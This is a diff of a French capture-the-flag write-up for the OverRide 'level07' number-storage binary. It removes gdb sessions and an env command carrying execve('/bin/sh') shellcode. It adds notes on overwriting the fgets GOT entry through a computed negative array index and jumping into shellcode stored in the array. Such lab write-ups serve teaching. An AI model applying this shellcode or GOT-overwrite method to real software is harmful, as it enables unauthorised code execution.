@@ -1,33 +1,8 @@
 # Level 07
 <a href="/level08"><img align='right' width=20x height=auto src="https://cdn.onlinewebfonts.com/svg/img_68680.png"></img></a>
 
-<pre>
-level07@OverRide:~$ gdb ./level07 
-
-(gdb) b \*0x080486cb
-Breakpoint 1 at 0x80486cb
-(gdb) r
-Starting program: /home/users/level07/level07 
-\----------------------------------------------------
-  Welcome to wil's crappy number storage service!   
-\----------------------------------------------------
- Commands:                                          
-    store - store a number into the data storage    
-    read  - read a number from the data storage     
-    quit  - exit the program                        
-\----------------------------------------------------
-   wil has reserved some storage :>                 
-\----------------------------------------------------
-
-Input command: store 
- Number: 999
- Index: 1
-
-Breakpoint 1, 0x080486cb in store\_number ()
-(gdb) x $eax
-0xffffd458:     0x00000000
-</pre>
-
+- On peut ecrire partout dans la memoire avec store sauf tout les 3 itterations
+- Il suffit donc d'ecrire par dessus fgets, l'addresse vers la quelle on redirige
 <pre>
 objdump -R ./level07 
 
@@ -50,57 +25,11 @@ OFFSET   TYPE              VALUE
 0804a024 R\_386\_JUMP\_SLOT   \_\_isoc99\_scanf@GLIBC\_2.7
 </pre>
 
-<pre>
-(gdb) r
-----------------------------------------------------
-  Welcome to wil's crappy number storage service!   
-----------------------------------------------------
- Commands:                                          store - store a number into the data storage    
-    read  - read a number from the data storage     
-    quit  - exit the program                        
-----------------------------------------------------
-   wil has reserved some storage :>                 
-----------------------------------------------------
-
-Input command: store
- Number: 123
- Index: -1040108819
-
-Breakpoint 1, 0x080486cb in store\_number ()
-(gdb) x $eax
-0x804a008 <getchar@got.plt>:    0xf7e94840
-</pre>
-
-<pre>
-level07@OverRide:~$ env -i SC=$(python -c "print('\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')") SHELL=/bin/bash gdb ./level07 
-
-(gdb) b main
-Breakpoint 1 at 0x8048729
-(gdb) r
-Starting program: /home/users/level07/level07 
-
-Breakpoint 1, 0x08048729 in main ()
-(gdb) x/10s \*\*(char\*\*\*)&environ
-0xffffdf7e:      "SHELL=/bin/bash"
-0xffffdf8e:      "COLUMNS=120"
-0xffffdf9a:      "PWD=/home/users/level07"
-0xffffdfb2:      "LINES=49"
-0xffffdfbb:      "SC=1\311\367\341Qh//shh/bin\211\343\260\v\315\200"
-0xffffdfd4:      "SHLVL=0"
-0xffffdfdc:      "/home/users/level07/level07"
-0xffffdff8:      ""
-0xffffdff9:      ""
-0xffffdffa:      ""
-(gdb) x 0xffffdfbb + 3
-0xffffdfbe:      "1\311\367\341Qh//shh/bin\211\343\260\v\315\200"
-</pre>
-
-```
-env -i SC=$(python -c "print('\x90' * 20  + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')") SHELL=/bin/bash
-```
-
-- Se qui est dans l'environnement et dans les arguments est supprimé
-
+- On ne peut pas rediriger vers l'environnement ou les argument car il sont supprimé
+- Il faut donc rediriger vers le tableau sur le quelle ont ecrit
+- Dans le ltrace il n'y a pas l'addresse de l'index 1 du tableau
+- Pour la connaitre il suffit donc de connaitre la difference entre le retour de fgets et l'index 1 du tableau puis de faire le calcul
+- Dans gdb on print donc ces deux addresses
 <pre>
 (gdb) b *0x08048887
 Breakpoint 1 at 0x8048887
@@ -141,7 +70,12 @@ Breakpoint 2, 0x080486cb in store_number ()
 (gdb) x $eax
 0xffffd44c:     0xffffd6b8 # index -2 du tableau
 </pre>
-
-- 0xffffd5e8 - 0xffffd458 = 0x190 = 400
-- ffffd5e8 - ffffd44c = 19c = 412
-- ffffd608 - 19c = ffffd46c
+- On peut faire nos calcul de difference:
+ - pour 1: 0xffffd5e8 - 0xffffd458 = 0x190 = 400
+ - pour -2: 0xffffd5e8 - 0xffffd44c = 0x19c = 412
+- Se qui donne:
+ - L'adresse de -1 est: 0xffffd608 - 0x190 = 0xffffd478
+ - L'index de l'addresse de fgets est: ((0x0804a00c - (0xffffd608 - 0x19c)) / 4) - 2 = -1040108826
+- Apres j'ai créé un programme qui modifie un shellcode en lui ajouter des jump se qui le permet de sauté les index ou je ne peut pas ecrire
+- Puis qui le converti en entrée pour le programme
+- Et voila il suffit apres cela de mettre l'entrée dans l'executable
